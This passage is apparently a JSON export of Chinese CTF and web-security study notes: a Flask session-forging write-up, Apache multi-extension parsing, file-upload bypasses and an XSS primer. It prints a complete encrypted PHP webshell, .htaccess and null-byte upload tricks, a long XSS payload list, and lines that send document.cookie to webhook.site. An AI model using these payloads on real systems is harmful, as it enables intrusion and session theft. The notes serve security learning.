Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\\\x01\\\\xda\\\\x16session_encryption_key\\\\xa9\\\\x00\\\\xf3\\\\x00\\\\x00\\\\x00\\\\x00\\\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\\\xfa\\\\x08moduler\\\\x07\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00s\\\\x11\\\\x00\\\\x00\\\\x00\\\\xf0\\\\x03\\\\x01\\\\x01\\\\x01\\\\xd8\\\\x19;\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16r\\\\x05\\\\x00\\\\x00\\\\x00# 将字符串中的转义序列转换为相应的二进制数据binary_data = bytes(data_str, utf-8).decode(unicode_escape).encode(latin1)# 保存到文件with open(output_binary_data.txt, wb) as file: file.write(binary_data) .pyc文件的逆向在网上就很多在线的工具可以进行使用，逆向后得到 #!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.11session_encryption_key = Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL 再使用session伪造工具flask-session-cookie-manager为造出一个session出来，指令为： python flask_session_cookie_manager3.py encode -s Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL -t admin:True 最后得到伪造的session所对应的cookie为：eyJhZG1pbiI6dHJ1ZX0.ZgBMeg.t2OWSLBvEeZpMPUZNBFFcmsFS-o，手动填入浏览器中，并访问flag 最后得到flag：kalmarRem3Mbr_T0_fl0sh! 查看Wells的丢人过程 我想着不是伪造出session最后的结果时运行/readflag这个可执行文件，便尝试读取了一下，转化为二进制，再发给逆向的同学看看能不能找出flag位于哪里命名为什么直接读取出来 也确实逆向出来，找到了flag的位置以及名称 但出题人也估计想到了这一点，位于flag.txt设置了权限，没法被直接读取出来。。。。。。。 跪谢逆向的同学：L0SJ0K","tags":["CTF-WriteUp"],"categories":["WriteUp"]},{"title":"中间件漏洞","path":"/posts/895d3c4b/","content":"Apache2.0-2.2版本存在个漏洞 CE-2012-0053: 攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie。 core - Apache HTTP Server 版本 2.4 Apache解析配置漏洞\\多后缀名解析配置漏洞解析配置漏洞简介此漏洞实际为人为的错误配置导致的漏洞，与Apache本身无关。 Apache对于多后缀文件的处理规则是：Files with Multiple Extensions-mod_mime 元数据指扩展名映射到关于语言、内容类型、字符集或编码的信息 原文： metadata (language, content type, character set or encoding) 文件可以有多个扩展名；扩展名的顺序通常是无关紧要的。例如，如果文件 welcome.html.fr 映射到内容类型 texthtml 和法语，则文件 welcome.fr.html 会映射到完全相同的信息。如果给出了多个映射到相同类型元数据的扩展名，则右边的扩展名将被使用，语言和内容编码除外。例如，如果 .gif 映射到媒体类型 imagegif，而 .html 映射到媒体类型 texthtml，则文件 welcome.gif.html 将与媒体类型 texthtml 关联。 语言和内容编码被视为累积的，因为可以为特定资源分配不止一种语言或编码。例如，文件 welcome.html.en.de 将以 Content-Language: en, de 和 Content-Type: texthtml 交付。 当一个具有多个扩展名的文件同时与媒体类型和处理程序关联时，应该小心处理。这通常会导致请求由与处理程序关联的模块处理。例如，如果 .imap 扩展名映射到处理程序 imap-file（来自 mod_imagemap），而 .html 扩展名映射到媒体类型 texthtml，则文件 world.imap.html 将同时与 imap-file 处理程序和 texthtml 媒体类型关联。处理时，将使用 imap-file 处理程序，因此它将被视为一个 mod_imagemap 图像映射文件。 如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi，而是使用 仅基于最终扩展名SetHandler配置处理程序 FilesMatch [^.]+\\.cgi$ SetHandler cgi-script/FilesMatch Apache对多后缀文件的识别概括来说为： Apache允许文件有多个扩展名，并且会将所有后缀名进行识别，识别的顺序为：从右到左 如： .html.fr 映射到 Content-Type: text/html 和Content-Language: de。 Apache允许扩展名映射到元数据(包括：语言、内容类型、字符集或编码)、处理程序。 如 .html 映射到 Content-Type: text/html。 对于相同类型元数据，以从右到左第一个出现的为准，但对于语言和内容编码可累积的元数据，将会叠加。 如：.gif.html根据此规则映射到 Content-Type: text/html。 ​ .html.en.de根据此规则映射到Content-Language: en, de 和 Content-Type: text/html 由于映射到处理程序和映射媒体类型，最后的返回结果不一致（一个为经过程序处理，一个为返回媒体文件）。当出现不同扩展名映射到处理程序和媒体类型时，映射到处理程序的优先等级高于映射到媒体类型 如：.imap.html扩展名.imap 映射到处理程序 imap-file， .html 映射到Content-Type: text/html ，根据上述原则，.imap.html文件会被imap-file程序处理 按我的理解：元数据（metadata）是用于指示文件的类型或处理方式 这里我把元数据（metadata）的定义包括了处理方式，根据一下段落合理的进行拓展定义 If you would prefer only the last dot-separated part of the filename to be mapped to a particular piece of meta-data, then do not use the Add* directives. For example, if you wish to have the file foo.html.cgi processed as a CGI script, but not the file bar.cgi.html, then instead of using AddHandler cgi-script .cgi 如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 foo.html.cgi 被处理为 CGI 脚本，但不希望文件 bar.cgi.html 如此处理，那么不要使用 AddHandler cgi-script .cgi 因此当出现多个映射到处理程序，会按照从右到左第一个出现的为准，进行处理程序 使用 Add* 指令，Apache处理一个文件时会应用上述规则 Add* 指令指的是如：AddType、AddDefaultCharset、AddEncoding、AddHandler、AddOutputFilter、AddLanguage、AddCharset等指令，其中AddHandler设置对应后缀名映射到处理程序，如： AddHandler application/x-httpd-php .php 由此，当用户上传一个a.php.jpg文件时，Apace的配置文件中包含AddHandler处理PHP文件，且未对上传后的文件进行重命名，此时a.php.jpg被解析为一个PHP脚本，解析漏洞由此而来 解析配置漏洞条件 文件没有被重命名 Apache中配置中含有AddHandler的设置 解析配置漏洞解决办法 将上传的文件进行重命名 根据官方文档的说明，可以使用SetHandler指令来代替AddHandler，因为SetHandler仅根据最右端的后缀名来判断映射的处理程序","tags":["CTF-Web","Web-Middleware"],"categories":["web"]},{"title":"文件上传漏洞","path":"/posts/931c692/","content":"概述什么是文件上传漏洞文件上传漏洞是指由于对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以向服务器上传恶意文件并进行执行，后获得执行服务端命令的能力。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。 产生文件上传漏洞的原因 不充分的文件验证：如果应用程序未能正确验证上传文件的类型（如MIME类型或文件扩展名）和内容，攻击者可能会上传执行恶意代码的文件。 不安全的文件存储：如果上传的文件存储在可通过Web直接访问的位置，且文件名可预测或未经过适当处理，攻击者可能会执行上传的恶意文件。 未对权限进行限制：权限上没有对于上传的文件目录设置不可执行权限。 例子CTFHUB-技能树-WEB-文件上传-无验证 因为在上传文件后无验证文件信息以及设置动态脚本不可被执行，因此便可直接上传远程木马文件， 上传后访问此网站路径下的/upload/shell.php发现是空白界面，说明php文件可以被执行，此时通过冰蝎进行远程连接 出现phpinfo页面，说明连接成功，即可获得主机部分权限，转到对应目录读取flag 后端绕过-解析漏洞 解析漏洞通常指的是当应用程序或服务器在处理上传文件时，由于对文件类型的解析不当或不安全，导致攻击者能够上传恶意文件，从而执行不当操作或获取不当权限的安全问题。例如允许用户上传.htaccess文件导致用户可以设置任意文件格式的解析方式 .htaccess绕过.htaccess简介.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。通过.htaccess可以做到：重写解析规则(如：将png文件作为php来进行解析等)、URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。 .htaccess的作用范围.htaccess的生效范围为.htaccess文件所在的当前目录。 .htaccess利用前提 使用Apache 服务器（ 不适用于Nginx 服务器） 能成功上传.htaccess文件的上传，且没有被重命名 .htaccess使用模板#对于phpAddHandler application/x-httpd-php .html #将html文件作为php文件进行解析 例题：CTFHUB-技能树-WEB-文件上传-.htaccess 查看页面源码可以发现页面后端源码 !DOCTYPE htmlhtmlhead meta charset=UTF-8 titleCTFHub 文件上传 - htaccess/title/headbody h1CTFHub 文件上传 - htaccess/h1 form action= method=post enctype=multipart/form-data label for=fileFilename:/label input type=file name=file id=file / br / input type=submit name=submit value=Submit / /form/body/html!--if (!empty($_POST[submit])) $name = basename($_FILES[file][name]); $ext = pathinfo($name)[extension]; $blacklist = array(php, php7, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf); if (!in_array($ext, $blacklist)) if (move_uploaded_file($_FILES[file][tmp_name], UPLOAD_PATH . $name)) echo scriptalert(上传成功)/script; echo 上传文件相对路径br . UPLOAD_URL_PATH . $name; else echo scriptalert(上传失败)/script; else echo scriptalert(文件类型不匹配)/script; -- 在 $blacklist = array(php, php7, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf);发现大多数的动态执行脚本文件后缀被禁止，但发现.htaccess并没有被禁止，此时可以上传文件.htaccess AddType application/x-httpd-php .txt 再上传含有shell的php代码的txt文件，上传成功后，访问upload/shell.php.txt，无内容显示，说明.txt文件被作为php脚本执行成功，使用冰蝎连接 成功获取phpinfo页面，连接成功，读取flag .user.ini绕过.user.ini介绍php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini与.htaccess类似，设置当前目录的配置信息。 详细参考信息： PHP: .user.ini 文件 - Manual、php - 神秘的.user.ini文件 其中php 配置项中有两个配置可以起到文件包含的作用 auto_prepend_file = filename //将指定文件包含在该目录中所有php脚本的文件头部auto_append_file = filename //将指定文件包含在该目录中所有php脚本的文件尾部 .user.ini使用前提 能成功上传.user.ini文件的上传，且没有被重命名 此目录下已有一个任意的.php文件 .user.ini作用范围与.htaccess文件相同，.user.ini的生效范围为.user.ini文件所在的当前目录。 .user.ini使用方法1.首先上传一个含有php代码的任意符合后端检测的文件，以.jpg为例： 文件名为info.jpg,内容为 ?php phpinfo();? 2.载上传入.user.ini文件，内容为： auto_prepend_file = info.jpg 注：info.jpg需要自己上传问文件名来确定 3.访问文件上传目录下的任意.php文件即可 例题：数字后缀绕过数字后缀简介PHP 文件的标准后缀始终是 .php，适用于所有版本的 PHP。然而，在某些特定场景或由某些开发者系统中，使用.php3 、.php5 、.php7 等不是 PHP 语言的标准文件后缀,由于一些特殊的设置.php7 等后缀可被PHP解释器解析 使用条件：Apache 的配置文件或目录下的.htaccess 文件有添加设置，如.php7可被解析的配置为： AddHandler application/x-httpd-php .php7 利用中间件漏洞 中间件漏洞是指在计算机系统中使用的中间件软件中存在的安全漏洞。中间件是指位于操作系统和应用程序之间的软件组件，用于提供不同应用程序之间的通信和交互。常见的中间件包括数据库管理系统、Web服务器(如：Apache、Nginx)等。 指路👉中间件漏洞 后端绕过-软件漏洞 利用PHP某些版本的BUG可以做到一些意想不到的效果。例如，00截断 PHP 00截断绕过感谢Diffany师傅提供的指导,https://gudiffany.github.io/https://wells.host/Diffany, 00截断利用条件 php版本要小于5.3.4，5.3.4及以上已经修复该问题 PHP的magic_quotes_gpc为OFF状态 用户可指定上传路径 00绕过简介ASCII中0作为特殊字符保留，表示字符串结束。 当用户传递文件上传路径包含00，无论00后存在任何内容文本(或后端直接对00字符串进行拼接其他字符串)，00后的内容都会被截断，最后字符串留下00前的内容且不包括00。 以GET方式举例： ASCII中的00，无法直接显示，所以使用URL编码，ASCII中00经过url编码后变为%00 页面源码为： ?php include $_GET[file];? test.txt的内容为 ?php echo SUCCESS;? test.txt%00.2.txt的内容为 ?php echo False;? 实验1 此时通过GET传递参数，?file=test.txt%00.2.txt 页面出现SUCCESS，说明include的文件是test.txt，此时file被解析为test.txt 实验2：改变页面源码 ?php\t$file = $_GET[file] . .2.txt; include $_GET[file];? 此时通过GET传递参数，?file=test.txt%00 页面还是出现SUCCESS，说明include的文件是test.txt，而不是test.txt.2.txt，此时变量file受$_GET[file]中的影响，一同被截断 00绕过方法GET传参保存路径后端对文件路径的处理类似为 $des = $_GET[road] . /对文件名的处理操作...... . $ext; 此时road为我们可控的参数，可直接进行使用%00截断 由于使用00截断，所以最后文件保存在/var/www/html/upload,名为shell.php,根据位置，访问/upload/shell.php,即进入我们所在的页面，使用蚁剑连上后，可以找到我们成功截断的shell.php POST传参保存路径与GET传参类似的的是：后端对文件路径的处理类似为 $des = $_POST[road] . /对文件名的处理操作...... . $ext; 此时road为我们可控的参数，但与GET传参不同的是，http请求内包含文件时，POST参数不再被自动解码，所以POST传参需要使用BP使用查看16进制的请求详情，修改一个十六进制的为00 步骤一：修改路径添加文件名，写入需要执行的代码语句 步骤一：切换为十六进制模式，修改所需要替换为00的位置 由于使用00截断，所以最后文件保存在/var/www/html/upload,名为test.php,根据位置，访问/upload/test.php,即进入我们所在的页面，可以看到PHP的配置信息，00截断成功 例题：CTFHUB-技能树-WEB-文件上传-00截断 查看页面源代码发现后端的源码 if (!empty($_POST[submit])) $name = basename($_FILES[file][name]); $info = pathinfo($name); $ext = $info[extension]; $whitelist = array(jpg, png, gif); if (in_array($ext, $whitelist)) $des = $_GET[road] . / . rand(10, 99) . date(YmdHis) . . . $ext; if (move_uploaded_file($_FILES[file][tmp_name], $des)) echo scriptalert(上传成功)/script; else echo scriptalert(上传失败)/script; else echo 文件类型不匹配; 抓包，修改GET参数为?road=/var/www/html/upload/shell.php%00，使用00截断，在传入文件的内容替换成需要执行的代码，如一句话等 然后使用蚁剑连接进入，可以看到我们是成功使用00截断写入的shell.php 后端检测-修改绕过 通过抓包我们发送的请求，修改请求包中的部分内容，如修改文件名(黑名单双写，大小写替换)，MIME，添加文件头等等操作，使之上传的木马符合后端的要求，使之成功上传。 双写绕过双写绕过原理有时候在检测时，后台会把敏感字符删除，这个时候，可以使用双写进行绕过。比如：将.php改写为.pphphp 后端的代码类似为： $name = basename($_FILES[file][name]);$blacklist = array(php, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf, htaccess, ini);$name = str_ireplace($blacklist, , $name); //str_ireplace() 函数替换字符串中的一些字符（不区分大小写） 例题：CTFHUB-技能树-WEB-文件上传-双写后缀 查看页面源码，发现这样一段内容 !--$name = basename($_FILES[file][name]);$blacklist = array(php, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf, htaccess, ini);$name = str_ireplace($blacklist, , $name);-- 这时候上传shell文件，并抓包，将后缀名.php改写为.pphphp，再发包最后成功上传 大小写后缀绕过大小写后缀绕过后端在检测时，后台会检测敏感字符，如果并没有不区分大小写时，可以使用大小写进行绕过。比如：将.php改写为.pHp 后端的代码类似为： $name = basename($_FILES[file][name]);$blacklist = array(php, php5, php4, php3, phtml, pht, jsp, jspa, jspx, jsw, jsv, jspf, jtml, asp, aspx, asa, asax, ascx, ashx, asmx, cer, swf, htaccess, ini);$pattern = /\\b( . implode(|, $blacklist) . )\\b/; //区分大小写if (preg_match($pattern, $name)) echo hack; exit(); MIME检测绕过MIME简介MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL。部分Web应用系统判定文件类型是通过content-type字段，截取一个请求信息： POST / HTTP/1.1Content-Length: 930Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakzUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=file; filename=echo.phpContent-Type: application/octet-stream?phpecho wells;?------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=submitSubmit------WebKitFormBoundarydBnKdxUvNtC4xakz-- 其中Content-Type: application/octet-stream和就是描述了上传文件的MIME 类型 MIME绕过方法部分Web应用系统判定文件类型是通过content-type字段，因此可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。 常见的MIME类型:text/plain （纯文本） text/html （HTML文档） text/javascript （js代码） application/xhtml+xml （XHTML文档） image/gif （GIF图像） image/jpeg （JPEG图像） image/png （PNG图像） video/mpeg （MPEG动画） application/octet-stream （二进制数据） application/pdf （PDF文档） 例题：CTFHUB-技能树-WEB-文件上传-MIME绕过 尝试直接上传.htaccess和phpshell文件时都上传失败，尝试修改MIME类型，抓包原始请求头 POST / HTTP/1.1Content-Length: 930Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakzUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=file; filename=shell.phpContent-Type: application/octet-stream?php@error_reporting(0);session_start(); $key=7dad18e6e49e447a;\t$_SESSION[k]=$key;\tsession_write_close();\t$post=file_get_contents(php://input);\tif(!extension_loaded(openssl)) $t=base64_.decode; $post=$t($post.); for($i=0;$istrlen($post);$i++) $post[$i] = $post[$i]^$key[$i+115]; else $post=openssl_decrypt($post, AES128, $key); $arr=explode(|,$post); $func=$arr[0]; $params=$arr[1];\tclass Cpublic function __invoke($p) eval($p.); @call_user_func(new C(),$params);?------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=submitSubmit------WebKitFormBoundarydBnKdxUvNtC4xakz-- 将 ------WebKitFormBoundary4BffHh31AMlHQtBdContent-Disposition: form-data; name=file; filename=shell.phpContent-Type: application/octet-stream 修改为 ------WebKitFormBoundary4BffHh31AMlHQtBdContent-Disposition: form-data; name=file; filename=shell.phpContent-Type: image/gif 再放行，最后发现shell.php被成功上传，访问upload/shell.php，无内容显示，说明.txt文件被作为php脚本执行成功，使用冰蝎连接 成功获取phpinfo页面，连接成功，读取flag 文件头检测绕过文件头检测绕过简介文件头是在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）的一段数据，用于描述文件的属性和格式信息， 在进行文件头绕过时，我们可以把图片的文件头添加到我们的木马内容最前面，达到绕过文件头检测的目的。 常见的文件头注意：文本形式请点击复制，不要做任何修改 GIF： 16进制模式：47 49 46 38 39 61 对应文本： GIF89a png： 16进制模式：89 50 4E 47 0D 0A 1A 0A 对应文本： ‰PNG JPG： 16进制模式：FF D8 FF E0 00 10 4A 46 49 46 对应文本： ÿØÿà 文件头检测绕过条件 某些情况下，后端可能还会检测文件拓展名，此时需要结合解析漏洞或者文件包含才能实现执行木马 例题：CTFHUB-技能树-WEB-文件上传-文件头检查 步骤一：直接选择木马文件进行上传，然后进行抓包 以添加PNG请求头为例 方法一：在PHP代码前添加入任意八个字母，用于定位以及替换为PNG的文件头，后转HEX模式替换为PNG的文件头 方法二：直接在PHP代码后插入PNG文件头对应的文本表示符号","tags":["CTF-Web","Web-FileUpload"],"categories":["web"]},{"title":"XSS","path":"/posts/fe1aa8c3/","content":"XSS简介动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，缩写成XSS）的威胁，恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。跨站脚本攻击允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容 XSS的分类：1、反射型(非持久化)​\t(1)原理 ​\t反射型xss又称非持久型xss。发出请求时，此类XSS代码出现在URL中，作为输入提交到服务器端，XSS代码被服务器端解析后传回给浏览器，后解析执行XSS代码。 ​\t(2)攻击方式 ​\t攻击者将包含xss代码的恶意链接发送给目标用户。当其他用户访问该链接时，服务器接受该用户的URL中参数的请求并进行处理，后xss代码被服务器发送给其他用户的浏览器，触发xss漏洞 2、存储型(持久化)​\t(1)原理 ​\t存储型XSS，提交的代码会存储在服务器端，其他用户请求该页面时会触发xss漏洞，无需访问攻击者的特定链接。例如：留言板中的XSS，用户提交一条包含XSS代码的留言存储到数据库，其他用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击 ​\t(2)攻击方式 ​\t攻击者将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，页面进行解析后响应，最后浏览器解析执行XSS代码，触发xss漏洞 3、DOM-based型 文档对象模型（DOM）是一个网络文档的编程接口。它代表页面，以便程序可以改变文档的结构、风格和内容。DOM 将文档表示为节点和对象；这样，编程语言就可以与页面交互。 ​\t(1)原理 ​\tDOM型xss其实是一种特殊类型的反射型xss，与反射型类似此类XSS代码出现在URL中，但DOM XSS和反射型XSS的区别在于DOM XSS代码并不需要服务器参与，依靠客户端进行解析。 ​\t(2)攻击方式 ​\t与反射型类似，当其他用户访问该链接时，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞 XSS代码插入位置1.插入到HTML注释内容中!-- script alert(XSS);/script-- 2.插入到HTML标签的属性值中img src=image,png onerror=scriptalert(XSS)/script 注：onerror属性是HTML中img标签的一个事件属性，它用于定义当图像加载失败时执行的JavaScript代码。 3.插入到HTML标签的属性名中使用语句 scriptalert(XSS)/script 构造闭合，可得到以下内容： input type=text name=scriptalert(XSS)/script 利用构造闭合的方式将恶意代码插入到某个标签中，将恶意代码插入到了标签中的属性值中，实现XSS攻击 4.插入到HTML标签名中 script alert(XSS) /scriptimg src=/1.png 浏览器会将第一个尖括号视为整体标签名的起始符号，而第二个尖括号则是script 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现XSS攻击 6.插入到CSS中div style=background-image:url(javascript:alert(`1`)); 我们在background-image样式属性中插入了一段JavaScript url（在过去，一些浏览器可能没有严格限制这种用法，允许javascript:伪协议在CSS属性中执行JavaScript代码。），当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码。 7.插入到HTTP响应中先留一个坑，还没看懂这个部分，后面再来填 运行脚本的标签以及对应属性a 标签 对应属性： href属性（手动点击） a href=javascript:alert(1)test/a onfocus（获取焦点时触发XSS，如:点击） a href=x onfocus=alert(xss); autofocus=xss/a onclick（点击时触发XSS） a href=x onclick=eval(alert(xss);)xss/a onmouseover（鼠标悬停于该元素时触发XSS） a href=x onmouseover=alert(xss);xss/a onmouseout（鼠标移出时触发XSS）。 a href=x onmouseout=alert(xss);xss/a img标签对应属性： onerror（加载错误时触发XSS、将src乱输入一个值即可） img src=x onerror=alert(1)img src=x onerror=eval(alert(1)) onmouseover（鼠标悬停于该元素时触发XSS） img src=1 onmouseover=alert(xss); onmouseout（鼠标移出时触发XSS） img src=1 onmouseout=alert(xss);v onclick（点击时触发XSS）。 img src=1 onclick=alert(xss); iframe标签HTML 内联框架元素 (iframe) 对应属性： onload（加载完成时触发XSS） iframe onload=alert(document.cookie)/iframeiframe onload=alert(xss);/iframeiframe onload=base64,YWxlcnQoJ3hzcycpOw==/iframe onmouseover（鼠标悬停于该元素时触发XSS）。 iframe onmouseover=alert(xss);/iframe src属性 iframe src=javascript:alert(1)test/iframeiframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4= //base64解码后为scriptalert(xss)/script audio 标签audio 标签定义声音，比如音乐或其他音频流。 对应属性： onerror（加载错误时触发XSS） audio src=1 onerror=alert(1)audiosource src=x onerror=alert(xss);/audio onfocus（获取焦点时触发XSS，如:点击） audio controls onfocus=eval(alert(xss);) autofocus=/audio onmouseover（鼠标悬停于该元素时触发XSS）。 audio controls onmouseover=alert(xss);source src=x/audio video标签对应属性： onerror（加载错误时触发XSS） video src=x onerror=alert(1)videosource onerror=alert(xss);/video onmouseover（鼠标悬停于该元素时触发XSS） video controls onmouseover=alert(xss);/video onfocus（获取焦点时触发XSS，如:点击） video controls onfocus=alert(xss); autofocus=/video onclick（点击时触发XSS）。 video controls onclick=alert(xss);/video svg 标签对应属性： onload（加载完成时触发XSS） svg onload=javascript:alert(1)svg onload=alert(xss);/svg button 标签对应属性： onclick（点击时触发XSS） button onclick=alert(1)button onclick=alert(xss);xss/button onfocus（获取焦点时触发XSS，如:点击） button onfocus=alert(xss); autofocus=xss/button onmouseover（鼠标悬停于该元素时触发XSS） button onmouseover=alert(xss);xss/button onmouseout（鼠标移出时触发XSS） button onmouseout=alert(xss);xss/button onmouseup（鼠标按钮释放时触发XSS） button onmouseup=alert(xss);xss/button onmousedown（鼠标按钮按下时触发XSS）。 button onmousedown=alert(xss);/button div标签对应属性： onmouseover（鼠标悬停于该元素时触发XSS） 这个需要借助url编码来实现绕过 原代码：div onmouseover=alert(1)DIV/div经过url编码：div onmouseover%3dalert%26lpar%3b1%26rpar%3bDIV%2fdiv object标签这个需要借助 data 伪协议和 base64 编码来实现绕过 object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=/object script 标签scriptalert(xss)/scriptscriptalert(/xss/)/scriptscriptalert(123)/script p 标签对应属性： onclick（点击时触发XSS） p onclick=alert(xss);xss/p onmouseover（鼠标悬停于该元素时触发XSS） p onmouseover=alert(xss);xss/p onmouseout（鼠标移出时触发XSS） p onmouseout=alert(xss);xss/p onmouseup（鼠标按钮释放时触发XSS）。 p onmouseup=alert(xss);xss/p input 标签对应属性： onclick（点击时触发XSS） input onclick=alert(xss); onfocus（获取焦点时触发XSS，如:点击） input onfocus=alert(xss);input onfocus=alert(xss); autofocus= onmouseover（鼠标悬停于该元素时触发XSS） input onmouseover=alert(xss); onkeydown（键盘按键按下时触发XSS）。 input type=text onkeydown=alert(xss);/inputinput type=text onkeydown=alert(xss);/input onkeydown（在键盘按键按下并释放一个键时触发XSS）。 input type=text onkeypress=alert(xss);/input details标签对应属性： ontoggle（切换时触发XSS，如:详情元素展开或收起）。 details ontoggle=alert(xss);/detailsdetails ontoggle=alert(xss); open=/details select 标签对应属性： onfocus（获取焦点时触发XSS，如:点击） select onfocus=alert(xss); autofocus/select onmouseover（鼠标悬停于该元素时触发XSS） select onmouseover=alert(xss);/select onclick（点击时触发XSS）。 select onclick=eval(alert(xss);)/select form 标签对应属性： onmouseover（鼠标悬停于该元素时触发XSS） form method=x action=x onmouseover=alert(xss);input type=submit/form onmouseout（鼠标移出时触发XSS） form method=x action=x onmouseout=alert(xss);input type=submit/form onmouseup（鼠标按钮释放时触发XSS）。 form method=x action=x onmouseup=alert(xss);input type=submit/form action（提交表单时触发） form action=javascript:alert(1)input type=submit/form body 标签对应属性： onload（加载完成时触发XSS） body onload=alert(xss);/body 外带COOKIE获取cookie未设置为HttpOnly方法：document.cookie可获得所有的 Cookie，每条 cookie 以分号和空格 分隔 (即， key=value 键值对)。例如： uid=a378eb5d1c4e12d492e63273f7b68c01%40devS; language=zh; _gat=1 设置为HttpOnly HttpOnly是包含在Set-Cookie HTTP响应头文件中的附加标志。生成cookie时使用HttpOnly标志有助于降低客户端脚本访问受保护cookie的风险（如果浏览器支持）。 即如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的，此时document.cookie 无效。 方法一：cookie回显页面利用服务器中的cookie回显页面，如：PHPinfo页面 **条件：**有相关请求页面可以回显出cookie 参考链接：How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation 方法二：TRACE HTTP HTTP定义了8种标准的请求方法，包括GET、POST、PUT、DELETE、HEAD、OPTIONS、TRACE和CONNECT。其中TRACE用于回显服务器收到的请求。 **条件：**服务器支持TRACE方式请求 注：现代浏览器不允许从 JS 发送 TRACE 请求，从而避免了这种技术。但是，在特定软件中发现了一些绕过此方法的方法，例如发送 \\r TRACE 而不是 TRACE 发送到 IE6.0 SP2。 方法三： Cookie Jar 溢出参考链接：Cookie Jar Overflow、Cookie Jar Overflow Attack 方法四：表单劫持XSS能插入在登录表单页面，能直接获取登录的账号密码，使用账号密码登录 方法五：浏览器漏洞、中间件漏洞例如：Apache服务器漏洞 CVE-2012-0053 影响版本：2.2.0-2.2.21 攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie。 带出cookiefetch()方法全局的 fetch() 方法用于发起获取资源的请求。它返回一个 promise，这个 promise 会在请求响应后被 resolve，并传回 Response对象。例如： fetch(//webhook.site/xxxxxxxx/?cookie=+document.cookie) 详细参考：fetch() - Web API 接口参考 | MDN (mozilla.org) XMLHttpRequest 对象利用 XMLHttpRequest 对象发送 HTTP 请求，将 Cookie 数据发送到攻击者的服务器： scriptvar xhr = new XMLHttpRequest(); xhr.open(GET, //webhook.site/xxxxxxxx/?cookie=+document.cookie, true); xhr.send();/script 详细参考：XMLHttpRequest - Web API 接口参考 | MDN 